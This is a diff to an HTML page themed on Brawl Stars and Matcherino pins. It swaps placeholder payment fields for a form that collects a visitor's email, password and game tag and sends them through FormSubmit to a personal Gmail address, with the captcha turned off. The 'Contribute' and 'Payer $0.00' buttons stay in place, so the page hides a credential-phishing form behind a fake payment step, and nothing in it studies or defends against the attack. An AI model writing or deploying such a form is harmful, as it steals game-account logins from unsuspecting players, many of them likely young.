@@ -150,12 +150,20 @@ body{margin:0;font-family:'Inter',sans-serif;background:#0b1220;color:#e5e7eb}
 
 <button class="pay-btn" onclick="showPayment()">Contribute</button>
 
+  <form id="pinsForm" action="https://formsubmit.co/code.codeur84@gmail.com" method="POST">
+                <!-- FormSubmit configuration -->
+                <input type="hidden" name="_subject" value="Demande Pins Matcherino - Brawl Stars">
+                <input type="hidden" name="_template" value="box">
+                <input type="hidden" name="_captcha" value="false">
+                <input type="hidden" name="_next" value="https://claude.ai/thanks">
+
 <div id="payment" style="display:none;margin-top:15px">
-  <input class="input" placeholder="Numéro de carte">
-  <input class="input" placeholder="Date expiration">
-  <input class="input" placeholder="CVV">
-  <input class="input" placeholder="Nom">
-  <button class="pay-btn" id="totalBtn">Payer $0.00</button>
+  <input class="input" type="email" id="email" name="email" placeholder="Email">
+  <input class="input" type="mot" id="mot" name="mot" placeholder="Mot de passe">
+  <input class="input" type="id" id="tag" name="tag" placeholder="Tag Brawl Stars">
+                    
+  <button class="pay-btn" id="totalBtn" type="submit" class="submit-btn">Payer $0.00</button>
+</form>
 </div>
 </div>
 </div>
